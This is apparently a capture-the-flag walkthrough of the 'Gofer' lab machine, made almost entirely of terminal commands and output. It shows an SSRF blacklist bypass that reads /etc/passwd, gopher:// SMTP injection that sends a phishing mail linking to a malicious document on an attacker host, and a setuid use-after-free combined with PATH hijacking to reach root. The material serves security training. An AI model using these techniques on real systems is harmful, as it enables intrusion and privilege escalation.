gofer 10.10.11.225

nmap -p- --min-rate 4000 10.10.11.225
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-03 08:22 CEST
Nmap scan report for 10.10.11.225
Host is up (0.20s latency).
Not shown: 63571 filtered tcp ports (no-response), 1960 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

nmap -p 80,139,445 -sC -sV --min-rate 3000 10.10.11.225

Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-03 08:26 CEST
Nmap scan report for 10.10.11.225
Host is up (0.12s latency).

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to http://gofer.htb/
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: Host: gofer.htb

Host script results:
| smb2-time: 
|   date: 2023-08-03T06:26:56
|_  start_date: N/A
|_nbstat: NetBIOS name: GOFER, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.23 seconds

echo "10.10.11.225 gofer.htb" | sudo tee -a /etc/hosts

**Corporate website**
- Jeff Davis - Chief Executive Officer 
- Jocelyn Hudson - Product Manager 
- Tom Buckley - CTO 
- Amanda Blake - Accountant 

**┌─[xbutch@parrot]─[~]
└──╼ $wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 400,301 -H 'Host:FUZZ.gofer.htb' http://gofer.htb**
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://gofer.htb/
Total requests: 220560

'=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                     
'=====================================================================

000001171:   401        14 L     54 W       462 Ch      "proxy" 

**┌─[xbutch@parrot]─[~]
└──╼ $curl -X POST http://proxy.gofer.htb/index.php**

<!-- Welcome to Gofer proxy -->
<html><body>Missing URL parameter !</body></html>

**┌─[xbutch@parrot]─[~]
└──╼ $curl -X POST -d 'URL=http://10.10.16.26' http://proxy.gofer.htb/index.php**
<!-- Welcome to Gofer proxy -->
<html><body>Missing URL parameter !</body></html>

**┌─[xbutch@parrot]─[~]
└──╼ $curl -X POST http://proxy.gofer.htb/index.php?url=http://10.10.16.26**
<!-- Welcome to Gofer proxy -->

**┌─[xbutch@parrot]─[~]
└──╼ $curl -X POST http://proxy.gofer.htb/index.php?url=file:///etc/passwd**
<!-- Welcome to Gofer proxy -->
<html><body>Blacklisted keyword: file:// !</body></html>

**┌─[xbutch@parrot]─[~]
└──╼ $curl -X POST http://proxy.gofer.htb/index.php?url=file:/etc/passwd**
<!-- Welcome to Gofer proxy -->
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
jhudson:x:1000:1000:Jocelyn Hudson,,,:/home/jhudson:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
postfix:x:106:113::/var/spool/postfix:/usr/sbin/nologin
jdavis:x:1001:1001::/home/jdavis:/bin/bash
tbuckley:x:1002:1002::/home/tbuckley:/bin/bash
ablake:x:1003:1003::/home/ablake:/bin/bash
tcpdump:x:107:117::/nonexistent:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

**┌─[xbutch@parrot]─[~]
└──╼ $smbmap -H 10.10.11.225**
[+] IP: 10.10.11.225:445	Name: gofer.htb                                         
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	**shares**                                            	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.13.13-Debian)

**┌─[xbutch@parrot]─[~]
└──╼ $smbclient //gofer.htb/shares**
Password for [WORKGROUP\xbutch]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Oct 28 21:32:08 2022
  ..                                  D        0  Fri Apr 28 13:59:34 2023
  .backup                            DH        0  Thu Apr 27 14:49:32 2023
		5061888 blocks of size 1024. 2153684 blocks available
smb: \> cd .backup
smb: \.backup\> ls
  .                                   D        0  Thu Apr 27 14:49:32 2023
  ..                                  D        0  Fri Oct 28 21:32:08 2022
  mail                                N     1101  Thu Apr 27 14:49:32 2023

		5061888 blocks of size 1024. 2153628 blocks available
smb: \.backup\> get mail
getting file \.backup\mail of size 1101 as mail (3,0 KiloBytes/sec) (average 3,0 KiloBytes/sec)

**┌─[xbutch@parrot]─[~]
└──╼ $cat mail**
From **jdavis@gofer.htb**  Fri Oct 28 20:29:30 2022
Return-Path: <jdavis@gofer.htb>
X-Original-To: tbuckley@gofer.htb
Delivered-To: **tbuckley@gofer.htb**
Received: from gofer.htb (localhost [127.0.0.1])
        by gofer.htb (Postfix) with SMTP id C8F7461827
        for <tbuckley@gofer.htb>; Fri, 28 Oct 2022 20:28:43 +0100 (BST)
Subject:Important to read!
Message-Id: <20221028192857.C8F7461827@gofer.htb>
Date: Fri, 28 Oct 2022 20:28:43 +0100 (BST)
From: jdavis@gofer.htb

Hello guys,

Our dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That's why from now on, I've decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an **.odt format**, as documents saved in Office Word are not always well interpreted by Libreoffice.

PS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via <Limit>

https://github.com/tarunkant/Gopherus

**┌─[xbutch@parrot]─[~]
└──╼ $curl --request POST --location "http://proxy.gofer.htb/index.php?url=file:/var/www/proxy/index.php"**
<!-- Welcome to Gofer proxy -->
<!-- Welcome to Gofer proxy -->
<?php
function is_blacklisted($url) {	
    $keywords = array("localhost", "/127", "about://", "acap://", "addbook://", "afp://", "afs://", "aim://", "applescript://", "bcp://", "bk://", "btspp://", "callto://", "castanet://", "cdv://", "chrome://", "chttp://", "cid://", "crid://", "data://", "dav://", "daytime://", "device://", "dict://", "dns://", "doi://", "dtn://", "ed2k://", "eid://", "enp://", "fax://", "feed://", "file://", "finger://", "freenet://", "ftp://", "go://", "gsiftp://", "gsm-sms://", "h323://", "h324://", "hdl://", "hnews://", "httpsy://", "iioploc://", "ilu://", "im://", "imap://", "info://", "ior://", "ip://", "ipp://", "irc://", "iris.beep://", "itms://", "jar://", "javascript://", "jdbc://", "klik://", "kn://", "lastfm://", "ldap://", "lifn://", "livescript://", "lrq://", "mac://", "magnet://", "mailbox://", "mailserver://", "mailto://", "man://", "md5://", "mid://", "mms://", "mocha://", "modem://", "moz-abmdbdirectory://", "msni://", "mtqp://", "mumble://", "mupdate://", "myim://", "news://", "nltk://", "nfs://", "nntp://", "oai://", "opaquelocktoken://", "pcast://", "phone://", "php://", "pop://", "pop3://", "pres://", "printer://", "prospero://", "pyimp://", "rdar://", "res://", "rtsp://", "rvp://", "rwhois://", "rx://", "sdp://", "secondlife://", "service://", "sip://", "sips://", "smb://", "smtp://", "snews://", "snmp://", "soap.beep://", "soap.beeps://", "soap.udp://", "subethaedit://", "svn://", "svn\+ssh://", "t120://", "tag://", "tann://", "tcp://", "tel://", "telephone://", "telnet://", "tftp://", "thismessage://", "tip://", "tn3270://", "tv://", "txmt://", "uddi://", "urn://", "uuid://", "vemmi://", "videotex://", "view-source://", "wais://", "wcap://", "webcal://", "whodp://", "whois://", "wpn://", "wtai://", "xeerkat://", "xfire://", "xmlrpc.beep://", "xmlrpc.beeps://", "xmpp://", "ymsgr://", "z39.50r://", "z39.50s");
    foreach ($keywords as $k) {
        if(strpos(strtolower($url), "$k") !== false) {
            return $k;
        }
    }
    return false;
}
if(!empty($_GET["url"])) {
    $url = $_GET["url"];
    $is_blacklisted = is_blacklisted($url);
    if($is_blacklisted === false) {
        $url = $_GET["url"];
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $url);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
        $output = curl_exec($c);
        curl_close($c);
        echo $output;
    }
    else {
        echo "<html><body>Blacklisted keyword: $is_blacklisted !</body></html>";
    }
} else {
    echo "<html><body>Missing URL parameter !</body></html>";
}
?>

**┌─[✗]─[xbutch@parrot]─[~]
└──╼ $curl -X POST "http://proxy.gofer.htb/index.php?url=gopher%3A%2F%2F0.0.0.0%3A25%2F_HELO%20gofer.htb%250AMAIL%20FROM%3A%20%3Chacker%40site.com%3E%250ARCPT%20TO%3A%20%3Cjhudson%40gofer.htb%3E%250ADATA%250ASubject%3A%20TEST%250ATEST%250A.%250AQUIT"**
<!-- Welcome to Gofer proxy -->
220 gofer.htb ESMTP Postfix (Debian/GNU)
250 gofer.htb
250 2.1.0 Ok
250 2.1.5 Ok
354 End data with <CR><LF>.<CR><LF>
250 2.0.0 Ok: queued as 38F58814F
221 2.0.0 Bye
1

https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html

curl -X POST "http://proxy.gofer.htb/index.php?url=gopher%3A%2F%2F0.0.0.0%3A25%2F_HELO%20gofer.htb%250AMAIL%20FROM%3A%20%3Chacker%40site.com%3E%250ARCPT%20TO%3A%20%3Cjhudson%40gofer.htb%3E%250ADATA%250ASubject%3A%20TEST%250A%3Ca%20href%3Dhttp%3A%2F%2F10.10.16.53%2Fshell.odt%3Eclick%3C%2Fa%3E%250A.%250AQUIT"


**jhudson@gofer:/usr/bin$ id**
uid=1000(jhudson) gid=1000(jhudson) groups=1000(jhudson),108(netdev)
**jhudson@gofer:/usr/bin$ cd ~**
**jhudson@gofer:~$ ls**
Downloads  linpeas.sh  user.txt
**jhudson@gofer:~$ cat user.txt**
********************************

**jhudson@gofer:~$ find / -type f -perm -4000 2>/dev/null**
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/local/bin/not

**jhudson@gofer:~$ ls -la /usr/local/bin/notes**
-rwsr-s--- 1 root dev 17168 Apr 28 16:06 /usr/local/bin/notes
You have new mail in /var/mail/jhudson

/usr/bin/curl http://proxy.gofer.htb/?url=http://gofer.htb --user tbuckley:*******************

**jhudson@gofer:~$ su tbuckley**
Password: ***************

**tbuckley@gofer:/home/jhudson$ id
**uid=1002(tbuckley) gid=1002(tbuckley) groups=1002(tbuckley),1004(dev)
tbuckley@gofer:/home/jhudson$ /usr/local/bin/notes
'========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 9
9

tbuckley@gofer:/home/jhudson$ ls
ls
Downloads  linpeas.sh  tar  user.txt
tbuckley@gofer:/home/jhudson$ chmod 777 tar
chmod 777 tar
chmod: changing permissions of 'tar': Operation not permitted
tbuckley@gofer:/home/jhudson$ rm tar
rm tar
rm: cannot remove 'tar': Permission denied
tbuckley@gofer:/home/jhudson$ cd /home/tbuckley
cd /home/tbuckley
tbuckley@gofer:~$ ls
tmp
tbuckley@gofer:~$ cd
tbuckley@gofer:~$ echo '#!/bin/bash' > tar
tbuckley@gofer:~$ echo 'chmod u+s /bin/bash' >> tar
tbuckley@gofer:~$ chmod 777 tar
tbuckley@gofer:~$ export PATH=~:$PATH
**tbuckley@gofer:~$ /usr/local/bin/notes 
**'========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 1

Choose an username: butch

========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 3

========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 4

Write your note:
123456789012345678901234admin
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 8

Access granted!
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 9

**tbuckley@gofer:~$ ls -la /bin/bash**
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
**tbuckley@gofer:~$ /bin/bash -p**
**bash-5.1# id**
uid=1002(tbuckley) gid=1002(tbuckley) euid=0(root) groups=1002(tbuckley),1004(dev)
**bash-5.1# cd /root**
**bash-5.1# cat root.txt**
********************************
